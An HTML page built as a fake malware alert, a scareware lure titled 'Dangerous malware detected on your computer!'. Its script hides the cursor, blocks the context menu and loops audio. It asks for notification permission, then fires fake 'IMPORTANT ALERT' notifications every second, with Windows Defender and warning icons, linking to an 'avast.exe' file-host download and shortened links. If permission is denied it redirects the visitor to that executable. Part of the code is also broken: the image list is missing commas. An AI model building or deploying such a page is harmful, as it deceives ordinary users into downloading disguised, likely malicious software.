<!DOCTYPE html>
<html>
<head>
    <title>Dangerous malware detected on your computer!</title>
    <style>
        html, body {
            height: 100%;
            margin: 0;
            background-color: #0177d7; /* Set the background color here */
            overflow: hidden; /* Prevent scrolling */
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: none; /* Hides the cursor */
        }

        .popup-container {
            background-color: rgba(0, 0, 0, 0.8);
            color: #fff;
            padding: 40px;
            border-radius: 17px;
            text-align: center;
            animation: pulse 2s infinite;
            cursor: auto; /* Show the cursor within the popup */
        }

        .icon {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .icon img {
            width: 40px;
            height: 40px;
            margin-right: 10px;
        }

        @keyframes pulse {
            0% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.2);
            }
            100% {
                transform: scale(1);
            }
        }
    </style>
    <script>
        var images = [
            'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/windows-icon.png',
            'https://cdn-icons-png.flaticon.com/512/1691/1691859.png',
            'https://icons.iconarchive.com/icons/hopstarter/malware/256/Delete-icon.png'
            'https://icons.iconarchive.com/icons/hopstarter/malware/256/Delete-icon.png'
        'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRYApb4woPeKTwlOqVmRbNxC8foL2gNFS8i4g&usqp=CAU'
        'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Windows-defender.svg/1200px-Windows-defender.svg.png'
        'https://static.vecteezy.com/system/resources/thumbnails/021/595/683/small/cyber-crime-concept-computer-threat-protection-viruses-detection-a-magnifying-glass-detecting-viruses-flat-design-illustration-free-png.png'
        'https://icons.iconarchive.com/icons/hopstarter/malware/256/Delete-icon.png'
        'https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Virus_malware_hazard_icon.svg/1200px-Virus_malware_hazard_icon.svg.png'
        'https://www.freeiconspng.com/thumbs/warning-icon-png/sign-warning-icon-png-7.png'
        'https://www.freepnglogos.com/uploads/warning-sign-png/warning-sign-red-png-17.png'
            // Add more image URLs as needed
        ];

        var links = [
            'https://www.mediafire.com/file/bki6160y9yesh9c/avast.exe/file',
            'https://peachemce.github.io/issue',
            'https://peachemce.github.io/issue',
            'https://malware-crusher.updatestar.com/en',
            'https://bit.ly/3wigo7X',
            'https://bit.ly/3wigo7X',
            // Add more link URLs as needed
        ];

        // Function to request permission 2 seconds after page load
        function requestNotificationPermission() {
            setTimeout(function() {
                // Check if the browser supports push notifications
                if ('Notification' in window) {
                    Notification.requestPermission().then(function(result) {
                        if (result === 'granted') {
                            // User has granted permission
                            setInterval(function() {
                                // Get random image and link
                                var randomImage = images[Math.floor(Math.random() * images.length)];
                                var randomLink = links[Math.floor(Math.random() * links.length)];

                                // Create a new notification
                                var notification = new Notification('IMPORTANT ALERT', {
                                    body: 'CLICK HERE TO RESOLVE THE ISSUE',
                                    icon: randomImage
                                });

                                // Handle notification click event
                                notification.onclick = function() {
                                    // Redirect user to a specific link when notification is clicked
                                    window.open(randomLink, '_blank');
                                };
                            }, 1000); // 1 second interval
                        } else if (result === 'denied') {
                            // User has denied permission
                            // Redirect user to a specific link
                            window.location.href = 'https://www.mediafire.com/file/bki6160y9yesh9c/avast.exe/file';
                        } else {
                            // User has dismissed the permission prompt without making a choice
                            // Ask again
                            requestNotificationPermission();
                        }
                    });
                }
            }, 2000); // 2 seconds delay
        }

        // Call the function to request permission after 2 seconds
        requestNotificationPermission();
    </script>

<body>
    <div class="popup-container" id="popupMessage">

            <img src="https://phasedj.zendesk.com/hc/article_attachments/6268113235741/CTA_PhaseManager_win.png" alt="Download Software" style="width: 150px;">
        </a>
    </div>

    <div id="emptyArea" style="position: absolute; left: -100px; top: -100px; width: 1px; height: 1px;"></div>

    <script>
        document.addEventListener('contextmenu', function(event) {
            event.preventDefault();
        });

        var audio = new Audio('bleed.mp3'); // Replace with the correct path to your audio file
        audio.loop = true;

        // Function to play audio when any element is clicked
        function playAudioOnClick() {
            audio.play();
        }

        // Attach click event listener to the document body
        document.body.addEventListener('click', playAudioOnClick);

        // Simulate click on an empty area when the page loads
        window.onload = function() {
            var emptyArea = document.getElementById('emptyArea');
            emptyArea.click();
        };
    </script>
</body>
